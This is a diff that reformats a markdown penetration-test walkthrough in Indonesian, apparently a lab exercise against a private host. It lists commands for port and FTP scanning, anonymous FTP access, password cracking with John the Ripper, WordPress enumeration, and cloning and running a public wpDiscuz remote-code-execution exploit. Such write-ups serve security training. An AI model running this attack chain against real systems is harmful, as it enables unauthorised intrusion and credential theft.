@@ -25,50 +25,71 @@ wpDiscuz RCE: CVSS Score: 9.8 (Critical) – Kerentanan RCE memberikan akses pen
 
 Vulnerable FTP:
 Pindai server untuk menemukan port yang terbuka:
+
 ```bash
 nmap -p- 10.15.42.245
 ```
+
 Pindai kerentanan FTP dengan Nmap:
+
 ````bash
 nmap --script=ftp-anon,ftp-vsftpd-backdoor -p21 10.15.42.245
 ```
+
 Login ke FTP menggunakan akun anonymous:
+
 ```bash
 ftp 10.15.42.245
 ```
+
 Download file yang ditemukan:
+
 ```bash
 ls
 get list.xyz
 get readme.txt
 ```
+
 Mencari username atau password dalam file:
+
 ```bash
 cat list.xyz
 grep -i "ethack" list.xyz
 ```
+
 Simpan hash dan crack dengan John the Ripper:
+
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
+
 Vulnerable WordPress Plugin:
 Gunakan GoBuster untuk mencari direktori tersembunyi:
+
 ```bash
 gobuster dir --url http://10.15.42.245:487 --wordlist /usr/share/wordlists/dirb/common.txt
 ```
+
 Gunakan wpscan untuk mendeteksi plugin WordPress yang terinstal:
+
 ```bash
 wpscan --url http://10.15.42.245:487 --enumerate p
 ```
+
 Clone exploit wpDiscuz:
+
 ```bash
 git clone https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE
 ```
+
 Jalankan exploit:
+
 ```bash
 sudo python3 wpDiscuz_RemoteCodeExec.py -u http://10.15.42.245:487 -p /2024/10/03/trial/
 ```
+
 Tampilkan:
+
 ```bash
 ls
 ```
